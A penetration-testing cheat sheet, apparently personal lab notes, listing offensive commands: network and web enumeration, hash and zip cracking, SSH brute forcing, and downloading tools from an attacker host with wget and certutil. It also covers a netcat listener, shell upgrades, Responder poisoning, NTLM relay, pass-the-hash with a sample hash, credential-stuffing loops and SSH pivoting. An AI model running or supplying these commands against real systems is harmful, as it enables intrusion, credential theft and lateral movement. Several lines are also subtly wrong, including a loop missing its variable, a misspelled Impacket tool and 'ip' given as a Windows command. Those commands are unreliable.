## General

rm -rf /path/to/directory

## Enumeration  

ip a  

arp-scan -l

showmount -e [server ip]

mount -t nfs [server ip]:[remote path shown from showmount] [to local mount point]

nmap -sV -A -T4 -p- 

nmap -sV -A -T4 --top-ports 500 [target]

nmap -sC [vuln scan of the default, light weight and safe NSE built in category of script]

nmap -p- --script vuln [target]

nmap --top-ports 500 --script vuln [target]

(Example when providing a txt based file to scan -iL 'inlist' must be used)  
nmap -p 445 -iL targets.txt

gobuster dir -u http://[IPaddress] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -v | grep "Status: 200"

gobuster dir -u http://[IPaddress] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error

assetfinder example.com

assetfinder --subs-only example.com

(directory hunting) ffuf -u http://localhost/capstone/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php -v | grep FUZZ 

python -V 

## Web Enumeration

Curl -I http://[target]

nikto -h http://[IPaddress:8080]

## DNS enumeration (workflow)

dig -x [IP]

nslookup [IP]

dnsrecon -r [IP range/24]

dnsrecon -r [target IP range/24 it belongs to] -n [targetIP]

## Cracking
Zip files: fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt [target.zip]

NTLM# hash: hashcat -m 5600 file.txt /usr/share/wordlists/rockyou.txt --force

    ntlm# will dictate the specific module -m required to be set for the cracking.  
    in virtual machine intances --force may be required.  
    if a password has already been cracked it may reside in the potfile on --show

hash-identifier

## Brute forcing
Hydra

nmap -p 22 --script ssh-brute --script-args="userdb=/path/to/username_wordlist.txt,passdb=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" 192.168.64.137


## Linux Post Exploitation
history

pwd

sudo -l

crontab -l

## Linux wget and curl command

wget http://192.168.64.137:8000/linpeas.sh -O linpeas.sh

🔼 Upgrading to an interactive shell using python  
python -c 'import pty; pty.spawn("/bin/bash")'

## Windows Post Exploitation
cd

whoami

ipconfig

dir

sc stop [application]

sc start [application]

sc query [application]

certutil.exe -urlcache -f http://[attackerip]:8000/[application.exe] [applicationname.exe]

### Windows System Enumeration
net user  
net user /domain  
net localgroup administrators  

set

systeminfo

hostname

(Patching enum) wmic qfe  
(Patching enum) wmic qfe get Caption,Description,HotFixID,InstalledOn  

(Driver enum) wmic logicaldisk get caption,description,providername  

### Windows User Enumeration

ip (more stealthier compared to whoami and presents more details)

whoami

whoami /priv

whoami /groups

(list all local user accounts on the windows system) net user

net user example user

(list all local group memberships) net localgroup

(list all users in the administrator group) net localgroup administrators

## Listener
nc -nlvp [port]

## Directory hosting
python2 - python -m SimpleHTTPServer

python3 - python3 -m http.server 8080

## Active Directory Attacks  

sudo responder -I tun0 -dwP | tun0 here is used when we are getting access via VPN

(Captures) LLMNR attacks  
sudo responder -I eth0 -dwv  

(Relays) SMB attack  
sudo responder -I eth0 -dPv  

(Relay authentication into targets | -i interacive shell | -c command execution)  
Impacket-ntlmrelax -tf targets.txt -smb2support -i 

(PtH with crackmapexec)  
crackmapexec smb 10.10.10.0/24 -u username -H aad3b435b51404eeaad3b435b51404ee:31dcfce0d16ae931b73c59d7e0c089c0  

(PtP with crackmapexec)  
crackmapexec smb 10.10.10.0/24 -u username -p 'password'  

(Enumerate service principile names with their krbtgs (kerberos ticket granting service hash) - useful in AD envs when SPN objects are not set to read only.  
Impacket-GetUserSPNs -dc-ip <10.10.10.0> domain/username:password -request  

**Identify hosts without SMB signing:** nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn  
In the event initial scanning of a known target presents no results adding -Pn will still scan the target and provide information regardless. 
  
## Bash; 'for' loops  

for in X variable varibale varibale; do COMMAND_LINE_ACTION $X; done  

(Example IP scan without text file list - ideal for small list, any large lists just use a .txt file)  
for ip in 10.10.10.1 10.10.10.2 10.10.10.3; do nmap -T4 -sV -A --top-ports 500 $ip; done  

(Example crackmap SMB enumeration - ideal for small list, any large lists just use a .txt file for username and passwords)  
for ip in 10.10.10.1 10.10.10.2 10.10.10.3; do crackmapexec smb $ip -u username -p 'password'; done  

(Example crackmap SMB credential 'sniper' stuffing password - small list)  
for ip in 10.10.10.1 10.10.10.2 10.10.10.3; do for in user Admin Administrator Username; do crackmapexec smb $ip -u $user -p password --local-auth; done; done  

(Example using .txt files within 'for' loops of crackmap SMB auth) - note: when using files for crackmapexec -P must be used instead of -p  
for user in Admin Administrator Username; do crackmapexec smb 10.10.10.1 -u $user -P passwordfile.txt --local-auth; done  

## RDP  

xfreerdp - xfreerdp /u:Administrator /p:'Password' /v:10.10.10.1

## Pivoting  

proxychains / conf files located at /etc/proxychains.conf  
ssh tunnel through 155.5, with connectioned dropped in the background.  
ssh -f -N -D 9050 -i encrypted_rsa1.key adminuser@10.10.155.5  

shuttle  

chisel  


